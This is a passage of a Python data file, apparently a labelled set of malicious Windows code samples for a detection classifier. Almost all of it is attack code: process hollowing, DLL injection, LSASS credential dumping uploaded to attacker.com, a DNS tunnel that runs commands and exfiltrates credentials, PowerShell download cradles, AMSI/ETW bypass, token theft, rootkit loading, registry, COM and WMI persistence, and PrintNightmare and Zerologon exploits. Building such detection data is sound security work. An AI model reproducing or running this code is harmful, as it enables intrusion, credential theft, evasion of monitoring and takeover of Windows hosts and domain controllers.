        ctypes.byref(STARTUPINFO),
        ctypes.byref(PROCESS_INFO)
    )

    hProcess = PROCESS_INFO.hProcess
    hThread = PROCESS_INFO.hThread

    # Unmap original image
    ctypes.windll.ntdll.NtUnmapViewOfSection(hProcess, ctypes.c_void_p(0x400000))

    # Allocate memory for malicious code
    base_addr = ctypes.windll.kernel32.VirtualAllocEx(
        hProcess,
        ctypes.c_void_p(0x400000),
        len(malicious_code),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x40  # PAGE_EXECUTE_READWRITE
    )

    # Write malicious code
    written = ctypes.c_size_t(0)
    ctypes.windll.kernel32.WriteProcessMemory(
        hProcess,
        base_addr,
        malicious_code,
        len(malicious_code),
        ctypes.byref(written)
    )

    # Resume thread
    ctypes.windll.kernel32.ResumeThread(hThread)

hollow_process("C:\\\\Windows\\\\System32\\\\svchost.exe", b"\\\\x90" * 1000)
""",
        "category": "process_hollowing",
        "description": "Process hollowing code injection",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes
import os

def inject_dll(pid, dll_path):
    # Get process handle
    PROCESS_ALL_ACCESS = 0x1F0FFF
    hProcess = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

    if not hProcess:
        return False

    # Allocate memory in target process
    dll_path_bytes = dll_path.encode('utf-8')
    arg_address = ctypes.windll.kernel32.VirtualAllocEx(
        hProcess,
        0,
        len(dll_path_bytes),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x4  # PAGE_READWRITE
    )

    # Write DLL path
    written = ctypes.c_int(0)
    ctypes.windll.kernel32.WriteProcessMemory(
        hProcess,
        arg_address,
        dll_path_bytes,
        len(dll_path_bytes),
        ctypes.byref(written)
    )

    # Get LoadLibraryA address
    kernel32 = ctypes.windll.kernel32
    load_library = kernel32.GetProcAddress(
        kernel32.GetModuleHandleW("kernel32.dll"),
        b"LoadLibraryA"
    )

    # Create remote thread
    thread_id = ctypes.c_ulong(0)
    hThread = kernel32.CreateRemoteThread(
        hProcess,
        None,
        0,
        load_library,
        arg_address,
        0,
        ctypes.byref(thread_id)
    )

    # Wait and cleanup
    kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)
    kernel32.CloseHandle(hThread)
    kernel32.CloseHandle(hProcess)

    return True

# Inject backdoor DLL
inject_dll(1234, "C:\\\\Windows\\\\Temp\\\\backdoor.dll")
""",
        "category": "dll_injection",
        "description": "DLL injection via CreateRemoteThread",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes
import struct

def dump_lsass_memory():
    # Get lsass.exe PID
    import psutil
    lsass_pid = None
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] == 'lsass.exe':
            lsass_pid = proc.info['pid']
            break

    if not lsass_pid:
        return None

    # Open process with PROCESS_ALL_ACCESS
    PROCESS_ALL_ACCESS = 0x1F0FFF
    hProcess = ctypes.windll.kernel32.OpenProcess(
        PROCESS_ALL_ACCESS,
        False,
        lsass_pid
    )

    # Create dump file
    hFile = ctypes.windll.kernel32.CreateFileW(
        "C:\\\\Windows\\\\Temp\\\\lsass.dmp",
        0xC0000000,  # GENERIC_READ | GENERIC_WRITE
        0,
        None,
        2,  # CREATE_ALWAYS
        0x80,  # FILE_ATTRIBUTE_NORMAL
        None
    )

    # Use MiniDumpWriteDump
    ctypes.windll.dbghelp.MiniDumpWriteDump(
        hProcess,
        lsass_pid,
        hFile,
        2,  # MiniDumpWithFullMemory
        None,
        None,
        None
    )

    ctypes.windll.kernel32.CloseHandle(hFile)
    ctypes.windll.kernel32.CloseHandle(hProcess)

    # Exfiltrate dump
    import base64
    with open("C:\\\\Windows\\\\Temp\\\\lsass.dmp", "rb") as f:
        dump_data = f.read()

    import requests
    requests.post("http://attacker.com/upload", data=base64.b64encode(dump_data))

dump_lsass_memory()
""",
        "category": "credential_dumping",
        "description": "LSASS memory dump for credential theft",
        "complexity": 3
    },
    {
        "code": """
import winreg
import os
import shutil

def hijack_registry():
    # Backdoor COM object
    CLSID = "{11111111-2222-3333-4444-555555555555}"
    malicious_dll = "C:\\\\Windows\\\\System32\\\\evil.dll"

    # Copy payload
    shutil.copy(__file__, malicious_dll)

    # Hijack CLSID
    key_path = f"Software\\\\Classes\\\\CLSID\\\\{CLSID}\\\\InprocServer32"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, malicious_dll)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
    except Exception as e:
        pass

    # Hijack existing COM
    legitimate_clsid = "{00021401-0000-0000-C000-000000000046}"  # ShellLink
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            f"Software\\\\Classes\\\\CLSID\\\\{legitimate_clsid}\\\\InprocServer32",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, malicious_dll)
        winreg.CloseKey(key)
    except:
        pass

    # AppInit_DLLs persistence
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, malicious_dll)
        winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

hijack_registry()
""",
        "category": "registry_manipulation",
        "description": "Registry hijacking for persistence",
        "complexity": 3
    },
    {
        "code": """
import socket
import base64
import dns.resolver
import dns.query
import dns.message

class CovertDNSChannel:
    def __init__(self, dns_server, domain):
        self.dns_server = dns_server
        self.domain = domain

    def exfiltrate_data(self, data):
        # Encode data to base32 (DNS-safe)
        encoded = base64.b32encode(data).decode().lower()

        # Split into chunks (max 63 chars per label)
        chunk_size = 60
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

        # Send via DNS queries
        for i, chunk in enumerate(chunks):
            subdomain = f"{i:04d}.{chunk}.{self.domain}"

            try:
                # Create DNS query
                query = dns.message.make_query(subdomain, 'A')
                response = dns.query.udp(query, self.dns_server, timeout=2)
            except Exception as e:
                pass  # Ignore failures, keep going

    def receive_commands(self):
        # Poll for commands via DNS TXT records
        while True:
            try:
                command_domain = f"cmd.{self.domain}"
                answers = dns.resolver.resolve(command_domain, 'TXT')

                for rdata in answers:
                    command = base64.b64decode(rdata.strings[0]).decode()
                    # Execute command
                    import subprocess
                    result = subprocess.check_output(command, shell=True)
                    self.exfiltrate_data(result)

            except Exception as e:
                pass

            import time
            time.sleep(300)  # Poll every 5 minutes

# Exfiltrate credentials
channel = CovertDNSChannel('8.8.8.8', 'attacker-controlled.com')

import os
credentials = os.popen('cmdkey /list').read().encode()
channel.exfiltrate_data(credentials)
""",
        "category": "covert_channel",
        "description": "DNS tunneling for data exfiltration",
        "complexity": 3
    },
    {
        "code": """
import subprocess
import base64
import sys

def powershell_fileless():
    # Stage 1: PowerShell download cradle
    ps_script = '''
    $url = 'http://attacker.com/payload.ps1'
    $code = (New-Object Net.WebClient).DownloadString($url)
    IEX $code
    '''

    # Encode to avoid detection
    ps_bytes = ps_script.encode('utf-16le')
    ps_encoded = base64.b64encode(ps_bytes).decode()

    # Execute in memory
    subprocess.Popen([
        'powershell.exe',
        '-NoProfile',
        '-NonInteractive',
        '-WindowStyle', 'Hidden',
        '-ExecutionPolicy', 'Bypass',
        '-EncodedCommand', ps_encoded
    ], shell=False, creationflags=0x08000000)  # CREATE_NO_WINDOW

def reflective_pe_injection():
    # Stage 2: Reflective PE loading
    ps_loader = '''
    function Invoke-ReflectivePEInjection {
        param($PEBytes)

        $PEHandle = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEBytes.Length)

        # Parse PE headers
        $e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($PEHandle, 0x3C)
        $ntHeaders = [IntPtr]($PEHandle.ToInt64() + $e_lfanew)

        # Allocate memory
        $sizeOfImage = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntHeaders, 0x50)
        $baseAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sizeOfImage)

        # Load PE and execute
        # ... reflective loading code ...
    }

    $url = 'http://attacker.com/payload.exe'
    $pe = (New-Object Net.WebClient).DownloadData($url)
    Invoke-ReflectivePEInjection -PEBytes $pe
    '''

    ps_bytes = ps_loader.encode('utf-16le')
    ps_encoded = base64.b64encode(ps_bytes).decode()

    subprocess.Popen([
        'powershell.exe',
        '-EncodedCommand', ps_encoded
    ], creationflags=0x08000000)

powershell_fileless()
""",
        "category": "fileless_attack",
        "description": "Fileless PowerShell attack with reflective PE",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes
import os

def steal_token(target_pid):
    # Open target process
    PROCESS_QUERY_INFORMATION = 0x0400
    hProcess = ctypes.windll.kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION,
        False,
        target_pid
    )

    # Open process token
    TOKEN_DUPLICATE = 0x0002
    TOKEN_QUERY = 0x0008
    hToken = wintypes.HANDLE()

    ctypes.windll.advapi32.OpenProcessToken(
        hProcess,
        TOKEN_DUPLICATE | TOKEN_QUERY,
        ctypes.byref(hToken)
    )

    # Duplicate token
    SECURITY_IMPERSONATION = 2
    TOKEN_ALL_ACCESS = 0xF01FF
    hDupToken = wintypes.HANDLE()

    ctypes.windll.advapi32.DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        None,
        SECURITY_IMPERSONATION,
        1,  # TokenPrimary
        ctypes.byref(hDupToken)
    )

    # Impersonate user
    ctypes.windll.advapi32.ImpersonateLoggedOnUser(hDupToken)

    # Create process with stolen token
    STARTUPINFO = subprocess.STARTUPINFO()
    PROCESS_INFO = subprocess.PROCESS_INFORMATION()

    ctypes.windll.advapi32.CreateProcessWithTokenW(
        hDupToken,
        0,
        "C:\\\\Windows\\\\System32\\\\cmd.exe",
        None,
        0,
        None,
        None,
        ctypes.byref(STARTUPINFO),
        ctypes.byref(PROCESS_INFO)
    )

    # Cleanup
    ctypes.windll.kernel32.CloseHandle(hToken)
    ctypes.windll.kernel32.CloseHandle(hDupToken)
    ctypes.windll.kernel32.CloseHandle(hProcess)

# Find SYSTEM process and steal token
import psutil
for proc in psutil.process_iter(['name', 'pid']):
    if proc.info['name'] == 'winlogon.exe':
        steal_token(proc.info['pid'])
        break
""",
        "category": "token_impersonation",
        "description": "Token theft and impersonation",
        "complexity": 3
    },
    {
        "code": """
import ctypes
import os
import sys

def load_unsigned_driver():
    # Disable driver signature enforcement via bcdedit
    os.system('bcdedit /set nointegritychecks on')
    os.system('bcdedit /set testsigning on')

    # Load driver
    driver_path = "C:\\\\Windows\\\\System32\\\\drivers\\\\rootkit.sys"

    SC_MANAGER_ALL_ACCESS = 0xF003F
    hSCManager = ctypes.windll.advapi32.OpenSCManagerW(
        None,
        None,
        SC_MANAGER_ALL_ACCESS
    )

    SERVICE_KERNEL_DRIVER = 0x1
    SERVICE_DEMAND_START = 0x3
    SERVICE_ERROR_IGNORE = 0x0

    hService = ctypes.windll.advapi32.CreateServiceW(
        hSCManager,
        "RootkitDriver",
        "RootkitDriver",
        0xF01FF,  # SERVICE_ALL_ACCESS
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driver_path,
        None,
        None,
        None,
        None,
        None
    )

    # Start driver
    ctypes.windll.advapi32.StartServiceW(hService, 0, None)

    # Communicate with driver via DeviceIoControl
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000

    hDevice = ctypes.windll.kernel32.CreateFileW(
        "\\\\\\\\.\\\\RootkitDevice",
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,  # OPEN_EXISTING
        0,
        None
    )

    # Send IOCTL to hide process
    IOCTL_HIDE_PROCESS = 0x222000
    pid = os.getpid()
    bytes_returned = ctypes.c_ulong()

    ctypes.windll.kernel32.DeviceIoControl(
        hDevice,
        IOCTL_HIDE_PROCESS,
        ctypes.byref(ctypes.c_ulong(pid)),
        4,
        None,
        0,
        ctypes.byref(bytes_returned),
        None
    )

    ctypes.windll.kernel32.CloseHandle(hDevice)

load_unsigned_driver()
""",
        "category": "kernel_driver",
        "description": "Malicious kernel driver loading",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes

def bypass_amsi():
    # Get AMSI module
    amsi = ctypes.windll.LoadLibrary("amsi.dll")

    # Get AmsiScanBuffer address
    AmsiScanBuffer = ctypes.windll.amsi.AmsiScanBuffer

    # Patch function
    # Original: mov r8d, [rsp+arg_20]
    # Patched: xor eax, eax; ret (return 0 = clean)
    patch = b"\\x31\\xC0\\xC3"

    # Change memory protection
    old_protect = wintypes.DWORD()
    ctypes.windll.kernel32.VirtualProtect(
        AmsiScanBuffer,
        len(patch),
        0x40,  # PAGE_EXECUTE_READWRITE
        ctypes.byref(old_protect)
    )

    # Write patch
    ctypes.memmove(AmsiScanBuffer, patch, len(patch))

    # Restore protection
    ctypes.windll.kernel32.VirtualProtect(
        AmsiScanBuffer,
        len(patch),
        old_protect,
        ctypes.byref(old_protect)
    )

def bypass_etw():
    # Patch EtwEventWrite
    ntdll = ctypes.windll.ntdll
    EtwEventWrite = ntdll.EtwEventWrite

    # Patch: xor eax, eax; ret
    patch = b"\\x31\\xC0\\xC3"

    old_protect = wintypes.DWORD()
    ctypes.windll.kernel32.VirtualProtect(
        EtwEventWrite,
        len(patch),
        0x40,
        ctypes.byref(old_protect)
    )

    ctypes.memmove(EtwEventWrite, patch, len(patch))

    ctypes.windll.kernel32.VirtualProtect(
        EtwEventWrite,
        len(patch),
        old_protect,
        ctypes.byref(old_protect)
    )

# Bypass security monitoring
bypass_amsi()
bypass_etw()

# Now execute malicious code without detection
exec(open('payload.py').read())
""",
        "category": "amsi_bypass",
        "description": "AMSI and ETW bypass via patching",
        "complexity": 3
    },
    {
        "code": """
import ctypes
from ctypes import wintypes
import subprocess

def spoof_parent_pid(target_parent_name="explorer.exe"):
    # Find target parent process
    import psutil
    target_pid = None
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] == target_parent_name:
            target_pid = proc.info['pid']
            break

    if not target_pid:
        return False

    # Open parent process
    PROCESS_ALL_ACCESS = 0x1F0FFF
    hParent = ctypes.windll.kernel32.OpenProcess(
        PROCESS_ALL_ACCESS,
        False,
        target_pid
    )

    # Initialize STARTUPINFOEX
    si = subprocess.STARTUPINFO()
    si_ex = ctypes.c_char * 1024
    si_ex_buf = si_ex()

    # Set attribute list
    size = ctypes.c_size_t()
    ctypes.windll.kernel32.InitializeProcThreadAttributeList(
        None,
        1,
        0,
        ctypes.byref(size)
    )

    attr_list = (ctypes.c_char * size.value)()
    ctypes.windll.kernel32.InitializeProcThreadAttributeList(
        attr_list,
        1,
        0,
        ctypes.byref(size)
    )

    # Update attribute with parent process
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    ctypes.windll.kernel32.UpdateProcThreadAttribute(
        attr_list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ctypes.byref(ctypes.c_void_p(hParent)),
        ctypes.sizeof(ctypes.c_void_p),
        None,
        None
    )

    # Create process with spoofed parent
    pi = subprocess.PROCESS_INFORMATION()
    ctypes.windll.kernel32.CreateProcessW(
        "C:\\\\Windows\\\\System32\\\\cmd.exe",
        "/c whoami",
        None,
        None,
        False,
        0x00080000,  # EXTENDED_STARTUPINFO_PRESENT
        None,
        None,
        ctypes.byref(si_ex_buf),
        ctypes.byref(pi)
    )

    ctypes.windll.kernel32.CloseHandle(hParent)
    return True

spoof_parent_pid()
""",
        "category": "ppid_spoofing",
        "description": "Parent PID spoofing for evasion",
        "complexity": 3
    },
    {
        "code": """
import winreg
import os
import shutil

def scheduled_task_persistence():
    # Copy to system directory
    malware_path = os.path.abspath(__file__)
    system_path = os.path.join(os.environ['WINDIR'], 'System32', 'update_checker.exe')
    shutil.copy2(malware_path, system_path)

    # Create scheduled task
    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <Triggers>
        <LogonTrigger>
          <Enabled>true</Enabled>
        </LogonTrigger>
        <TimeTrigger>
          <Repetition>
            <Interval>PT1H</Interval>
          </Repetition>
          <Enabled>true</Enabled>
        </TimeTrigger>
      </Triggers>
      <Principals>
        <Principal>
          <UserId>S-1-5-18</UserId>
          <RunLevel>HighestAvailable</RunLevel>
        </Principal>
      </Principals>
      <Settings>
        <Hidden>true</Hidden>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
      </Settings>
      <Actions>
        <Exec>
          <Command>{system_path}</Command>
        </Exec>
      </Actions>
    </Task>'''

    # Write XML
    xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
    with open(xml_path, 'w') as f:
        f.write(task_xml)

    # Register task
    os.system(f'schtasks /create /tn "WindowsUpdateCheck" /xml "{xml_path}" /f')
    os.remove(xml_path)

    # Also add WMI persistence
    wmi_script = f'''
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
        Name = "SystemFilter"
        EventNameSpace = "root\\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }}

    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
        Name = "SystemConsumer"
        CommandLineTemplate = "{system_path}"
    }}

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
        Filter = $filter
        Consumer = $consumer
    }}
    '''

    import subprocess
    subprocess.run(['powershell', '-Command', wmi_script], shell=True)

scheduled_task_persistence()
""",
        "category": "scheduled_task",
        "description": "Scheduled task and WMI persistence",
        "complexity": 3
    },
    {
        "code": """
import winreg
import os
import sys
import shutil

def wmi_persistence():
    malware_path = os.path.abspath(__file__)
    system_path = os.path.join(os.environ['PROGRAMDATA'], 'Windows', 'svchost.exe')

    os.makedirs(os.path.dirname(system_path), exist_ok=True)
    shutil.copy2(malware_path, system_path)

    # Create WMI event subscription
    wmi_filter = '''
    $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{
        Name = "ServiceFilter"
        EventNamespace = "root\\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
    }
    '''

    wmi_consumer = f'''
    $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
        Name = "ServiceConsumer"
        CommandLineTemplate = "{system_path}"
        RunInteractively = $false
    }}
    '''

    wmi_binding = '''
    $Binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
    '''

    full_script = wmi_filter + wmi_consumer + wmi_binding

    import subprocess
    subprocess.run([
        'powershell',
        '-NoProfile',
        '-WindowStyle', 'Hidden',
        '-Command', full_script
    ], shell=True, creationflags=0x08000000)

    # Also add COM hijack as backup
    com_hijack()

def com_hijack():
    malware_path = os.path.abspath(__file__)

    # Hijack InprocServer32
    clsid = "{4590F811-1D3A-11D0-891F-00AA004B2E24}"  # wbemprox.dll
    key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, malware_path)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Both")
        winreg.CloseKey(key)
    except:
        pass

wmi_persistence()
""",
        "category": "wmi_persistence",
        "description": "WMI event subscription persistence",
        "complexity": 3
    },
    {
        "code": """
import winreg
import os
import shutil
import sys

def com_hijack_persistence():
    malware_path = os.path.abspath(__file__)

    # Target legitimate COM objects
    targets = [
        "{4590F811-1D3A-11D0-891F-00AA004B2E24}",  # wbemprox.dll
        "{0002DF01-0000-0000-C000-000000000046}",  # internet explorer
        "{00BB2763-6A77-11D0-A535-00C04FD7D062}",  # autoplay
    ]

    for clsid in targets:
        # Create registry key
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"

        try:
            # Backup original
            try:
                orig_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_dll, _ = winreg.QueryValueEx(orig_key, "")
                winreg.CloseKey(orig_key)
            except:
                original_dll = None

            # Set malicious DLL
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, malware_path)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")

            # Store original for proxying
            if original_dll:
                winreg.SetValueEx(key, "OriginalDLL", 0, winreg.REG_SZ, original_dll)

            winreg.CloseKey(key)
        except Exception as e:
            pass

def appinit_dll_persistence():
    malware_path = os.path.abspath(__file__)

    # Copy to System32
    dll_name = "security_module.dll"
    system32 = os.path.join(os.environ['WINDIR'], 'System32')
    target_path = os.path.join(system32, dll_name)

    try:
        shutil.copy2(malware_path, target_path)
    except:
        pass

    # Set AppInit_DLLs registry
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
        )

        # Get existing DLLs
        try:
            existing, _ = winreg.QueryValueEx(key, "AppInit_DLLs")
        except:
            existing = ""

        # Add our DLL
        new_value = f"{existing},{target_path}" if existing else target_path

        winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, new_value)
        winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "RequireSignedAppInit_DLLs", 0, winreg.REG_DWORD, 0)

        winreg.CloseKey(key)
    except:
        pass

com_hijack_persistence()
appinit_dll_persistence()
""",
        "category": "com_hijacking",
        "description": "COM hijacking with AppInit_DLLs",
        "complexity": 3
    },
    {
        "code": """
import subprocess
import os

def exploit_print_spooler():
    # CVE-2021-34527 (PrintNightmare)
    ps_script = '''
    function Invoke-Nightmare {
        param($DllPath)

        # Add printer driver with malicious DLL
        $driverPath = "C:\\Windows\\System32\\DriverStore\\FileRepository"

        # Create driver
        Add-PrinterDriver -Name "Evil Driver" -InfPath "C:\\Windows\\inf\\ntprint.inf"

        # Modify driver DLL path
        $regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\Evil Driver"
        Set-ItemProperty -Path $regPath -Name "Data File" -Value $DllPath
        Set-ItemProperty -Path $regPath -Name "Configuration File" -Value $DllPath

        # Trigger load
        Add-Printer -DriverName "Evil Driver" -Name "EvilPrinter" -PortName "FILE:"

        # Cleanup
        Remove-Printer -Name "EvilPrinter"
        Remove-PrinterDriver -Name "Evil Driver"
    }

    # Upload malicious DLL
    $dllBytes = [System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA...")
    [IO.File]::WriteAllBytes("C:\\Windows\\System32\\spool\\drivers\\x64\\3\\evil.dll", $dllBytes)

    Invoke-Nightmare -DllPath "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\evil.dll"
    '''

    # Encode and execute
    import base64
    ps_bytes = ps_script.encode('utf-16le')
    ps_encoded = base64.b64encode(ps_bytes).decode()

    subprocess.run([
        'powershell',
        '-NoProfile',
        '-WindowStyle', 'Hidden',
        '-EncodedCommand', ps_encoded
    ], creationflags=0x08000000)

    # Also try direct exploitation
    import ctypes

    # Load winspool.drv
    winspool = ctypes.windll.LoadLibrary("winspool.drv")

    # Call AddPrinterDriverEx with malicious path
    # ... exploitation code ...

exploit_print_spooler()
""",
        "category": "print_spooler_exploit",
        "description": "PrintNightmare exploitation",
        "complexity": 3
    },
    {
        "code": """
import subprocess
import os
import sys

def zerologon_exploit():
    # CVE-2020-1472 Zerologon exploitation
    netlogon_script = '''
    Import-Module ActiveDirectory

    function Invoke-ZeroLogon {
        param($DCName, $DCIp)

        # Build NetrServerPasswordSet2 request with zero authentication
        $null_signature = [byte[]]::new(8)  # All zeros

        # Create Netlogon channel
        $channel = New-Object System.Net.Sockets.TcpClient($DCIp, 445)
        $stream = $channel.GetStream()

        # Send exploit payload
        for ($i = 0; $i -lt 2000; $i++) {
            # Send NetrServerPasswordSet2 with zero authenticator
            $payload = Build-NetrServerPasswordSet2 -ComputerName $DCName -Authenticator $null_signature

            $stream.Write($payload, 0, $payload.Length)
            $response = Read-Response($stream)

            if ($response.ReturnCode -eq 0) {
                Write-Host "[+] Success! DC account password cleared"

                # Now authenticate with empty password
                $cred = New-Object System.Management.Automation.PSCredential("$DCName$", (New-Object System.Security.SecureString))

                # Create domain admin account
                New-ADUser -Name "BackdoorAdmin" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Enabled $true -Credential $cred

                # Add to Domain Admins
                Add-ADGroupMember -Identity "Domain Admins" -Members "BackdoorAdmin" -Credential $cred

                break
            }
        }

        $channel.Close()
    }

    Invoke-ZeroLogon -DCName "DC01" -DCIp "192.168.1.10"
    '''

    import base64
    ps_bytes = netlogon_script.encode('utf-16le')
    ps_encoded = base64.b64encode(ps_bytes).decode()

    subprocess.run([
        'powershell',
        '-NoProfile',
        '-EncodedCommand', ps_encoded
    ])

zerologon_exploit()
""",
        "category": "zerologon_exploit",
        "description": "Zerologon domain controller exploit",
        "complexity": 3
    }
]

if __name__ == "__main__":
    print(f"Level 3 Expansion: {len(LEVEL3_BENIGN_EXPANSION)} benign + {len(LEVEL3_MALICIOUS_EXPANSION)} malicious")
    print(f"Total: {len(LEVEL3_BENIGN_EXPANSION) + len(LEVEL3_MALICIOUS_EXPANSION)} new samples")

